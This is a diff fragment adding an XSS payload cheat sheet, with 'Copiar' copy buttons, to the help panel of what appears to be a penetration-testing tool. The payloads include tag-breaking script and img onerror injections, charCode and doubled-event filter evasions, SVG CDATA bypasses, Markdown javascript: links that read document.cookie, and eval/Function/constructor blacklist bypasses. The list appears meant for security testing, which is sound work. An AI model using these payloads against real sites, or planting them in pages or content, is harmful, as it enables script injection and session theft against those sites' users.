+          <span class="sqlmap-cmd-label">Break + charCode</span>
+          <code class="sqlmap-cmd-code">"&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">img comment //</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror=alert('XSS')//</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">img charCode</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">doubled event</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">src eval alt</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Break img alert</span>
+          <code class="sqlmap-cmd-code">"&gt;&lt;img src=x onerror=alert("XSS");&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Break img charCode</span>
+          <code class="sqlmap-cmd-code">"&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">SVG — CDATA bypass</h3>
+      <div class="sqlmap-cmd-list" aria-label="SVG CDATA">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">onload domain</span>
+          <code class="sqlmap-cmd-code">&lt;svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">desc CDATA</span>
+          <code class="sqlmap-cmd-code">&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">foreignObject</span>
+          <code class="sqlmap-cmd-code">&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">title CDATA</span>
+          <code class="sqlmap-cmd-code">&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">XSS em Markdown</h3>
+      <div class="sqlmap-cmd-list" aria-label="Markdown XSS">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">js: prompt</span>
+          <code class="sqlmap-cmd-code">[a](javascript:prompt(document.cookie))</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">js: espaçado</span>
+          <code class="sqlmap-cmd-code">[a](j a v a s c r i p t:prompt(document.cookie))</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">data:base64</span>
+          <code class="sqlmap-cmd-code">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">onerror throw</span>
+          <code class="sqlmap-cmd-code">[a](javascript:window.onerror=alert;throw%201)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Blacklist bypass — code eval</h3>
+      <div class="sqlmap-cmd-list" aria-label="Blacklist bypass">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">eval concat</span>
+          <code class="sqlmap-cmd-code">eval('ale'+'rt(0)');</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Function()</span>
+          <code class="sqlmap-cmd-code">Function('ale'+'rt(1)')();</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">new Function tag</span>
+          <code class="sqlmap-cmd-code">new Function`alert`6``;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">setTimeout</span>
+          <code class="sqlmap-cmd-code">setTimeout('ale'+'rt(2)');</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">setInterval</span>
+          <code class="sqlmap-cmd-code">setInterval('ale'+'rt(10)');</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Set.constructor</span>
+          <code class="sqlmap-cmd-code">Set.constructor('ale'+'rt(13)')();</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Set.constr tag</span>
+          <code class="sqlmap-cmd-code">Set.constructor`alert(14)```;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
 </body>
 </html>
